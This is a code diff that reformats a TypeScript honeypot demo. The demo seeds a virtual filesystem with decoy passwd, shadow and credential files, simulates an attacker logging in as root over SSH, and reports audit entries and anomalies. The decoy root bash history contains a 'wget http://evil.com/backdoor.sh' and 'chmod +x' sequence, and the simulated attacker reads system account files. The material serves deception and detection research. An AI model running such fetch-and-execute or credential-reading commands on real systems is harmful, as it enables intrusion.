@@ -16,12 +16,27 @@ shell.users.setPassword("root", "root");
 const vfs = shell.getVfs()!;
 const users = shell.getUsers()!;
 
-vfs.writeFile("/etc/passwd", "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash");
-vfs.writeFile("/etc/shadow", "root:!:19000:0:99999:7:::\nadmin:$6$salt$hash:19000:0:99999:7:::");
+vfs.writeFile(
+	"/etc/passwd",
+	"root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash",
+);
+vfs.writeFile(
+	"/etc/shadow",
+	"root:!:19000:0:99999:7:::\nadmin:$6$salt$hash:19000:0:99999:7:::",
+);
 vfs.writeFile("/home/admin/.ssh/authorized_keys", "ssh-rsa AAAA... decoy-key");
-vfs.writeFile("/var/log/auth.log", "Jan 1 00:00:00 honeypot sshd[1]: Server listening on 0.0.0.0 port 22");
-vfs.writeFile("/opt/credentials.txt", "db_password=S3cretP@ss\napi_key=sk-fake-12345");
-vfs.writeFile("/root/.bash_history", "cat /etc/shadow\nwget http://evil.com/backdoor.sh\nchmod +x backdoor.sh");
+vfs.writeFile(
+	"/var/log/auth.log",
+	"Jan 1 00:00:00 honeypot sshd[1]: Server listening on 0.0.0.0 port 22",
+);
+vfs.writeFile(
+	"/opt/credentials.txt",
+	"db_password=S3cretP@ss\napi_key=sk-fake-12345",
+);
+vfs.writeFile(
+	"/root/.bash_history",
+	"cat /etc/shadow\nwget http://evil.com/backdoor.sh\nchmod +x backdoor.sh",
+);
 
 const honeypot = new HoneyPot(10000);
 honeypot.attach(shell, vfs, users);
@@ -40,7 +55,12 @@ const port = await ssh.start();
 console.log("\n--- Simulate attacker activity ---");
 
 const attacker = new SshClient();
-await attacker.connect({ host: "localhost", port, username: "root", password: "root" });
+await attacker.connect({
+	host: "localhost",
+	port,
+	username: "root",
+	password: "root",
+});
 
 const commands = [
 	"cat /etc/passwd",
@@ -79,7 +99,9 @@ console.log(`\n  Total audit entries: ${auditLog.length}`);
 console.log("\n  Recent events:");
 const recent = honeypot.getRecent(10);
 for (const entry of recent) {
-	console.log(`    [${entry.type}] ${entry.source}: ${JSON.stringify(entry.details).slice(0, 80)}`);
+	console.log(
+		`    [${entry.type}] ${entry.source}: ${JSON.stringify(entry.details).slice(0, 80)}`,
+	);
 }
 
 const anomalies = honeypot.detectAnomalies();
